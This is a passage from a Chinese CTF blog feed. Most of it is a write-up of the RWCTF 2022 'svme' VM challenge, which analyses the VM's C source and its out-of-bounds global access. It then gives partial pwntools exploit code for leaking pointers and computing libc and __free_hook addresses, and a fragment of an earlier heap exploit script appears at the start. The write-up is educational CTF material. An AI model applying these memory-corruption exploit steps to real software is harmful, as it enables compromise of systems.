class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line">IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        <span class="built_in">print</span>(possible_IO_str_jumps_offset)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="grape"><a href="#grape" class="headerlink" title="grape"></a>grape</h2>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RWctf-2022-svme</title>
      <link href="/2022/01/27/RWctf-2022-svme/"/>
      <url>/2022/01/27/RWctf-2022-svme/</url>
      
        <content type="html"><![CDATA[<p>第一次做VM相关题目，之前也有看到过，但是逆向虚拟机实在太复杂，而且别人的wp根本不会去讲怎么逆向的。这次2022RWctf一上来就是vm题，但是给了源码，而且是比较简短的虚拟机，正好可以借此学习一下逆向vm与一般vm的写法和漏洞点。</p><span id="more"></span><h1 id="svme"><a href="#svme" class="headerlink" title="svme"></a>svme</h1><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><h3 id="指令集与结构体"><a href="#指令集与结构体" class="headerlink" title="指令集与结构体"></a>指令集与结构体</h3><p>在此vm中，有以下的指令集</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    NOOP    = <span class="number">0</span>,</span><br><span class="line">    IADD    = <span class="number">1</span>,   <span class="comment">// int add</span></span><br><span class="line">    ISUB    = <span class="number">2</span>,   <span class="comment">// int sub</span></span><br><span class="line">    IMUL    = <span class="number">3</span>,   <span class="comment">// int multiply</span></span><br><span class="line">    ILT     = <span class="number">4</span>,   <span class="comment">// int less than</span></span><br><span class="line">    IEQ     = <span class="number">5</span>,   <span class="comment">// int equal</span></span><br><span class="line">    BR      = <span class="number">6</span>,   <span class="comment">// branch</span></span><br><span class="line">    BRT     = <span class="number">7</span>,   <span class="comment">// branch if true</span></span><br><span class="line">    BRF     = <span class="number">8</span>,   <span class="comment">// branch if true</span></span><br><span class="line">    ICONST  = <span class="number">9</span>,   <span class="comment">// push constant integer</span></span><br><span class="line">    LOAD    = <span class="number">10</span>,  <span class="comment">// load from local context</span></span><br><span class="line">    GLOAD   = <span class="number">11</span>,  <span class="comment">// load from global memory</span></span><br><span class="line">    STORE   = <span class="number">12</span>,  <span class="comment">// store in local context</span></span><br><span class="line">    GSTORE  = <span class="number">13</span>,  <span class="comment">// store in global memory</span></span><br><span class="line">    PRINT   = <span class="number">14</span>,  <span class="comment">// print stack top</span></span><br><span class="line">    POP     = <span class="number">15</span>,  <span class="comment">// throw away top of stack</span></span><br><span class="line">    CALL    = <span class="number">16</span>,  <span class="comment">// call function at address with nargs,nlocals</span></span><br><span class="line">    RET     = <span class="number">17</span>,  <span class="comment">// return value from function</span></span><br><span class="line">    HALT    = <span class="number">18</span></span><br><span class="line">&#125; VM_CODE;</span><br></pre></td></tr></table></figure><p>如果了解ARM架构会对此指令集比较熟悉，这个指令集和ARM很类似。</p><p>与之相关的，有以下的虚拟机操作函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VM *<span class="title function_">vm_create</span><span class="params">(<span class="type">int</span> *code, <span class="type">int</span> code_size, <span class="type">int</span> nglobals)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vm_free</span><span class="params">(VM *vm)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vm_init</span><span class="params">(VM *vm, <span class="type">int</span> *code, <span class="type">int</span> code_size, <span class="type">int</span> nglobals)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vm_exec</span><span class="params">(VM *vm, <span class="type">int</span> startip, <span class="type">bool</span> trace)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vm_print_instr</span><span class="params">(<span class="type">int</span> *code, <span class="type">int</span> ip)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vm_print_stack</span><span class="params">(<span class="type">int</span> *<span class="built_in">stack</span>, <span class="type">int</span> count)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vm_print_data</span><span class="params">(<span class="type">int</span> *globals, <span class="type">int</span> count)</span>;</span><br></pre></td></tr></table></figure><p>可以看到这个vm能做的比较少，只有新建，执行，free以及一些调试函数。</p><p>分析一下第一个函数的返回值，VM结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> *code;</span><br><span class="line">    <span class="type">int</span> code_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// global variable space</span></span><br><span class="line">    <span class="type">int</span> *globals;</span><br><span class="line">    <span class="type">int</span> nglobals;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Operand stack, grows upwards</span></span><br><span class="line">    <span class="type">int</span> <span class="built_in">stack</span>[DEFAULT_STACK_SIZE];</span><br><span class="line">    Context call_stack[DEFAULT_CALL_STACK_SIZE];</span><br><span class="line">&#125; VM;</span><br></pre></td></tr></table></figure><p>其中包含了代码指针（为什么用int？这是因为这个虚拟机是一个定长指令架构，每条指令长度都为4B，在.h文件中写明了）。观察以下交互代码，会更容易理解。下图中红色的是指令，蓝色的是指令的操作数。</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220127124332799.png" alt="image-20220127124332799"></p><p>结构体还有全局变量起始地址和数量、向上生长的栈空间。接下来可以分析执行函数了。</p><h3 id="vm-create"><a href="#vm-create" class="headerlink" title="vm_create"></a>vm_create</h3><p>vm_create和vm_init起到创建vm和分配空间的作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VM *<span class="title function_">vm_create</span><span class="params">(<span class="type">int</span> *code, <span class="type">int</span> code_size, <span class="type">int</span> nglobals)</span></span><br><span class="line">&#123;</span><br><span class="line">    VM *vm = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(VM));</span><br><span class="line">    vm_init(vm, code, code_size, nglobals);</span><br><span class="line">    <span class="keyword">return</span> vm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vm_init</span><span class="params">(VM *vm, <span class="type">int</span> *code, <span class="type">int</span> code_size, <span class="type">int</span> nglobals)</span></span><br><span class="line">&#123;</span><br><span class="line">    vm-&gt;code = code;</span><br><span class="line">    vm-&gt;code_size = code_size;</span><br><span class="line">    vm-&gt;globals = <span class="built_in">calloc</span>(nglobals, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    vm-&gt;nglobals = nglobals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="vm-exec"><a href="#vm-exec" class="headerlink" title="vm_exec"></a>vm_exec</h3><p>vm_exec是虚拟机执行函数。虚拟机整体是利用switch case执行的内部定义代码。这个函数比较长。</p><p>首先是寄存器定义。此虚拟机只模拟了三个寄存器，指令、栈指针和调用栈指针。可想而知，此虚拟机是利用栈传递函数调用的参数的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vm_exec</span><span class="params">(VM *vm, <span class="type">int</span> startip, <span class="type">bool</span> trace)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// registers</span></span><br><span class="line">    <span class="type">int</span> ip;         <span class="comment">// instruction pointer register</span></span><br><span class="line">    <span class="type">int</span> sp;         <span class="comment">// stack pointer register</span></span><br><span class="line">    <span class="type">int</span> callsp;     <span class="comment">// call stack pointer register</span></span><br></pre></td></tr></table></figure><p>接下来是初始化值的设置。对于上面三个寄存器其中ip设置为main.c中的启动位置，为0，另外两个设置为-1，表示未初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ip = startip;</span><br><span class="line">sp = <span class="number">-1</span>;</span><br><span class="line">callsp = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> opcode = vm-&gt;code[ip];</span><br></pre></td></tr></table></figure><p>接下来是循环体。用于处理自定义汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (opcode != HALT &amp;&amp; ip &lt; vm-&gt;code_size) &#123;</span><br><span class="line">    <span class="keyword">if</span> (trace) vm_print_instr(vm-&gt;code, ip);</span><br><span class="line">    ip++; <span class="comment">//jump to next instruction or to operand</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> IADD:</span><br><span class="line">            b = vm-&gt;<span class="built_in">stack</span>[sp--];           <span class="comment">// 2nd opnd at top of stack</span></span><br><span class="line">            a = vm-&gt;<span class="built_in">stack</span>[sp--];           <span class="comment">// 1st opnd 1 below top</span></span><br><span class="line">            vm-&gt;<span class="built_in">stack</span>[++sp] = a + b;       <span class="comment">// push result</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>可以看到这里trace其实是给了我们一个调试函数，可以打印吃vm当前执行的指令和栈。对于我们理解vm如何运作至关重要。</p><p>在这里，我们看到了第一个指令IADD。根据注释，可以看出它其实是整数相加。怎么运作呢？首先取出a，b两个操作数（存在栈上）并同时减少sp栈指针寄存器（栈向上生长）接着把栈顶存上a+b的值也就是iadd的结果。</p><p>接着的isub和imul也是一模一样的。需要注意的是isub是先入栈的作为被减数。例如isub 5 2计算的是5-2=3，后面3被放回栈顶。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ISUB:</span><br><span class="line">    b = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    a = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = a - b;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IMUL:</span><br><span class="line">    b = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    a = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = a * b;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>后面两个操作数是比较大小。基本语法和上面十分类似，大家可以自己学着分析。主语ilt是将第一个操作数和第二个做对比。例如ilt 2 3返回的是true（放在栈顶），因为2小于3。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ILT:</span><br><span class="line">    b = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    a = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = (a &lt; b) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IEQ:</span><br><span class="line">    b = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    a = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = (a == b) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>接下来是三个跳转指令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> BR: <span class="comment">// 直接跳转</span></span><br><span class="line">    ip = vm-&gt;code[ip];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BRT: <span class="comment">// 正确时跳转</span></span><br><span class="line">    addr = vm-&gt;code[ip++];</span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;<span class="built_in">stack</span>[sp--] == <span class="literal">true</span>) ip = addr;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BRF: <span class="comment">// 错误时跳转</span></span><br><span class="line">    addr = vm-&gt;code[ip++];</span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;<span class="built_in">stack</span>[sp--] == <span class="literal">false</span>) ip = addr;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>跳转指令作为控制指令的核心内容，需要认真分析构成形式。</p><p><strong>直接跳转</strong>：如果碰到BR指令，可以看到它不需要操作数，直接取出代码段的下一条指令开始执行。相当于x86中的jmp。</p><p><strong>条件跳转</strong>：条件跳转判断的依据是在栈顶的操作数。注意这里很有意思的一点是true和false全部宏定义为1和0.这意味着我们完全可以通过写入值来作为跳转条件执行汇编代码。这里请注意，为什么这里的<code>addr = vm-&gt;code[ip++];</code>而不是像br一样的直接是ip呢？因为跳转有错误的可能，如果错误我们就直接按照原先的指令执行下去即可。一般原先的指令将会是一个jmp，这样就不会执行到<code>code[ip++]</code>的位置了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ICONST:</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = vm-&gt;code[ip++];  <span class="comment">// push operand</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> LOAD: <span class="comment">// load local or arg</span></span><br><span class="line">    offset = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = vm-&gt;call_stack[callsp].locals[offset];</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>接下来是全局变量设置指令。iconst指令起到初始化变量，将他们放置在栈上的作用。load指令先获取要load第几个操作数，之后将他储存在当前栈上。这里<code>callsp</code>变量记录了当前函数所在栈。locals表示储存的变量。在后面会被设置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> GLOAD: <span class="comment">// load from global memory</span></span><br><span class="line">    addr = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = vm-&gt;globals[addr];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> STORE:</span><br><span class="line">    offset = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;call_stack[callsp].locals[offset] = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> GSTORE: <span class="comment">// store to global variable</span></span><br><span class="line">    addr = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;globals[addr] = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这里可以看到对于全局变量，会被放在不同于之前locals的栈中，以便所有函数都可以访问到。注意这里store指令设置了<code>locals</code>数组，记录了在多少偏移量位置，放置什么参数。其中参数就是之前在栈上的，使用GLOAD设置的内容。通过以下程序片段，能够更好的理解以上两个操作数。</p><p><img src="/2022/01/27/RWctf-2022-svme/image-20220127121027358.png" alt="image-20220127121027358"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PRINT:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, vm-&gt;<span class="built_in">stack</span>[sp--]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> POP:</span><br><span class="line">    --sp;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>print和pop函数自然不用说。注意这里pop似乎是只减少栈指针，并不返回数据。不过可以和print结合使用。</p><p>比较重要的是<code>call</code>指令，该指令的作用是调用函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> CALL:</span><br><span class="line">    <span class="comment">// expects all args on stack</span></span><br><span class="line">    addr = vm-&gt;code[ip++];<span class="comment">// index of target function</span></span><br><span class="line">    <span class="type">int</span> nargs = vm-&gt;code[ip++]; <span class="comment">// how many args got pushed</span></span><br><span class="line">    <span class="type">int</span> nlocals = vm-&gt;code[ip++]; <span class="comment">// how many locals to allocate</span></span><br><span class="line">    ++callsp; <span class="comment">// bump stack pointer to reveal space for this call</span></span><br><span class="line">    vm_context_init(&amp;vm-&gt;call_stack[callsp], ip, nargs+nlocals);</span><br><span class="line">    <span class="comment">// copy args into new context</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;nargs; i++) &#123;</span><br><span class="line">        vm-&gt;call_stack[callsp].locals[i] = vm-&gt;<span class="built_in">stack</span>[sp-i];</span><br><span class="line">    &#125;</span><br><span class="line">    sp -= nargs;</span><br><span class="line">    ip = addr;<span class="comment">// jump to function</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>调用的过程如下</p><ul><li>栈上第一个数据是调用函数地址</li><li>第二个数据是调用时参数个数</li><li>第三个数据是被调函数(callee)本地局部变量数量。</li></ul><p>接下来自增栈指针，表示切换栈到此函数位置。初始化callee调用栈。其中vm_context_init内容如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> returnip;</span><br><span class="line">    <span class="type">int</span> locals[DEFAULT_NUM_LOCALS];</span><br><span class="line">&#125; Context;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">vm_context_init</span><span class="params">(Context *ctx, <span class="type">int</span> ip, <span class="type">int</span> nlocals)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ( nlocals&gt;DEFAULT_NUM_LOCALS ) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;too many locals requested: %d\n&quot;</span>, nlocals);</span><br><span class="line">    &#125;</span><br><span class="line">    ctx-&gt;returnip = ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到也没有做很多事情。主要是设置了<code>context-&gt;returnip</code>。这个我们后面也会用到。</p><p>接下来把原先栈（caller）的参数拷贝到被调栈中，修改caller的栈指针位置（减去之前复制好的参数）</p><p>最后把ip寄存器改成当前要执行函数的第一条地址。</p><p>最后的ret函数，确保能够回到caller。这里似乎可以看出，调用栈深度只能支持1，因为每次复制参数都是从main的栈中复制的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> RET:</span><br><span class="line">    ip = vm-&gt;call_stack[callsp].returnip;</span><br><span class="line">    callsp--; <span class="comment">// pop context</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这里的<code>returnip</code>正是上面所设置的。至此我们分析完了vm_exec中的所有指令。可以看出还是比较简单的。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="/2022/01/27/RWctf-2022-svme/image-20220127112521974.png" alt="image-20220127112521974"></p><p>保护全开的虚拟机。回想一下创建虚拟机时是在堆上，所有的指令也都在堆上，因此栈溢出也无法实现，但是堆相关的操作也仅仅有开始的create和结尾的free，操作受限十分严重。一开始我就分析到这里，没有了思路。</p><p>参考的hackinTN的<a href="https://ctftime.org/writeup/32099">wp</a>，接下来做一点分析。</p><h3 id="step1-get-host-stack"><a href="#step1-get-host-stack" class="headerlink" title="step1: get host stack"></a>step1: get host stack</h3><p>注意到VM结构体里面code指针指向的是从host输入的指针。我们需要得到这个数据。利用对global一开始设置的大小为0，可以实现向上溢出，复制到我们的虚拟机栈空间。由于VM本身是64位的，需要经过两次load得到较大和较小的两个值。一旦得到了这个数据，就可以<strong>覆盖globals指针为这个值从而对栈操作</strong>。（关键还是覆盖指针）这里的0x2100是因为vm结构体大小是0x2100，这样的偏移对应的正好是code指针。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gload &#123;-0x2100 // 4 + 1&#125;</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">gload &#123;-0x2100 // 4&#125;</span></span><br><span class="line"><span class="string">store 1</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">code=<span class="string">b&quot;&quot;</span></span><br><span class="line">code+=p32(<span class="number">11</span>) + p32(<span class="number">0xfffff7c1</span>) </span><br><span class="line">code+=p32(<span class="number">12</span>) + p32(<span class="number">0x0</span>)</span><br><span class="line">code+=p32(<span class="number">11</span>) + p32(<span class="number">0xfffff7c0</span>)</span><br><span class="line">code+=p32(<span class="number">12</span>) + p32(<span class="number">0x1</span>)</span><br><span class="line">code+=p32(<span class="number">14</span>)</span><br><span class="line">code+=p32(<span class="number">14</span>)</span><br><span class="line">code+=p32(<span class="number">14</span>)</span><br></pre></td></tr></table></figure><h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>目的相当于是把libc_start_main加载到vm栈空间，后面用来计算free_hook。这里的偏移通过调试得到libc相关地址和globals指针的偏移量（在main函数的ret中，一定包含libc_start_main）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step2 get __libc_start_main, using gdb to find __libc_start_main is 0x218 to *globals</span></span><br><span class="line"><span class="comment"># load it to stack</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">load 1</span></span><br><span class="line"><span class="string">load 0</span></span><br><span class="line"><span class="string">iconst 0</span></span><br><span class="line"><span class="string">gload &#123;0x218 // 4 + 1&#125;</span></span><br><span class="line"><span class="string">store 0</span></span><br><span class="line"><span class="string">gload &#123;0x218 // 4&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code+=p32(LOAD) + p32(<span class="number">1</span>)</span><br><span class="line">code+=p32(LOAD) + p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(ICONST) + p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(GLOAD) + p32(<span class="number">135</span>)</span><br><span class="line">code+=p32(STORE) + p32(<span class="number">0</span>)</span><br><span class="line">code+=p32(GLOAD) + p32(<span class="number">134</span>)</span><br></pre></td></tr></table></figure><h3 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h3><p>第三步：计算libc基地址以及free_hook地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step3 get free_hook, now libc_addr is already on the vm stack, we can using it to calculate free_hook addr</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">iconst &#123;libc.libc_start_main_return&#125;</span></span><br><span class="line"><span class="string">isub</span></span><br><span class="line"><span class="string">iconst &#123;libc.symbols[&#x27;__free_hook&#x27;]&#125;</span></span><br><span class="line"><span class="string">iadd&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code+=p32(ICONST) + p32(libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>])</span><br><span class="line">code+=p32(ISUB) <span class="comment"># get libc_base and store on VM&#x27;s stack</span></span><br><span class="line">code+=p32(ICONST) + p32(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])</span><br><span class="line">code+=p32(IADD) <span class="comment"># libc_base+free_hook store on vm&#x27;s stack</span></span><br></pre></td></tr></table></figure><h3 id="step4"><a href="#step4" class="headerlink" 